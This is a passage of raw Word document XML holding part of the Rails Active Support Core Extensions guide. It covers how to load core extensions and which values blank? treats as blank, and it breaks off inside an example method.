            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>atomic_write</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="74098921" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId486" w:anchor="19" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>Logger</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CDEBB63" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId487" w:anchor="19-1" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>around_[level]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="77C79D4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId488" w:anchor="19-2" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>silence</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3FEA9918" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId489" w:anchor="19-3" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>datetime_format=</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="26000CF4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId490" w:anchor="20" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>NameError</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6AFDC14F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="273"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId491" w:anchor="21" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Extensions to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>LoadError</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="23EDD748" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 How to Load Core Extensions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7668A810" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.1 Stand-Alone Active Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="280475E2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In order to have a near zero default footprint, Active Support does not load anything by default. It is broken in small pieces so that you may load just what you need, and also has some convenience entry points to load related extensions in one shot, even everything.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E2B338C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Thus, after a simple require like:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2880"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="4BCF66F8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="6A655088" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1566144679"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="6EAE11B5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">objects do not even respond to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t>. Let’s see how to load its definition.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26EA2FE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.1.1 Cherry-picking a Definition</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013BD6EF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The most lightweight way to get </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is to cherry-pick the file that defines it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FB13C87" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For every single method defined as a core extension this guide has a note that says where such a method is defined. In the case of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> the note reads:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7D6BFF9A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Defined in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/object/blank.rb</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3339A65D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>That means that this single call is enough:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5520"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="101CA013" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="45B01B85" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1445659067"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/core_ext/object/blank'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3535BBD0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Active Support has been carefully revised so that cherry-picking a file loads only strictly needed dependencies, if any.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6972FC44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.1.2 Loading Grouped Core Extensions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B44B782" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The next level is to simply load all extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. As a rule of thumb, extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>SomeClass</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are available in one shot by loading </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>active_support/core_ext/some_class</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1640EB44" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Thus, to load all extensions to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>Object</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (including </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t>):</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="17E15D47" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="538E5F0D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="2097363459"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/core_ext/object'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="3BC42151" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.1.3 Loading All Core Extensions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E3F06ED" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You may prefer just to load all core extensions, there is a file for that:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3960"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="3D4327DD" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="02F99E86" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="100344231"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/core_ext'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="545D1111" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="5"/>
      </w:pPr>
      <w:r>
        <w:t>1.1.4 Loading All Active Support</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1164AA78" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>And finally, if you want to have all Active Support available just issue:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3360"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="566966CA" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="5DEC89A5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="756247889"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'active_support/all'</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="24994A25" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">That does not even put the entire Active Support in memory upfront indeed, some stuff is configured via </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>autoload</w:t>
      </w:r>
      <w:r>
        <w:t>, so it is only loaded if used.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE4376" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>1.2 Active Support Within a Ruby on Rails Application</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="492ECD6C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">A Ruby on Rails application loads all Active Support unless </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>config.active_support.bare</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is true. In that case, the application will only load what the framework itself cherry-picks for its own needs, and can still cherry-pick itself at any granularity level, as explained in the previous section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="238B93FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>2 Extensions to All Objects</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CB8E5AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">2.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>present?</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1C4F90AA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>The following values are considered to be blank in a Rails application:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336D7E6F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="274"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>nil</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>false</w:t>
      </w:r>
      <w:r>
        <w:t>,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A983667" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="275"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>strings composed only of whitespace (see note below),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C6BCB3D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="276"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t>empty arrays and hashes, and</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E609105" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="277"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">any other object that responds to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>empty?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and it is empty.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79A82695" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">In Ruby 1.9 the predicate for strings uses the Unicode-aware character class </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>[:space:]</w:t>
      </w:r>
      <w:r>
        <w:t>, so for example U</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>2029 (paragraph separator) is considered to be whitespace. In Ruby 1.8 whitespace is considered to be \s together with the ideographic space U</w:t>
      </w:r>
      <w:r>
        <w:t>3000.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42DD240E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Note that numbers are not mentioned, in particular 0 and 0.0 are </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="aa"/>
        </w:rPr>
        <w:t>not</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> blank.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38BD05BA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">For example, this method from </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>ActionDispatch::Session::AbstractStore</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>blank?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> for checking whether a session key is present:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="6048"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0FBE42EC" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="469185D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>def</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ensure_session_key!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="57C857B4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>@key.blank?</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3BD982FC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    raise</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
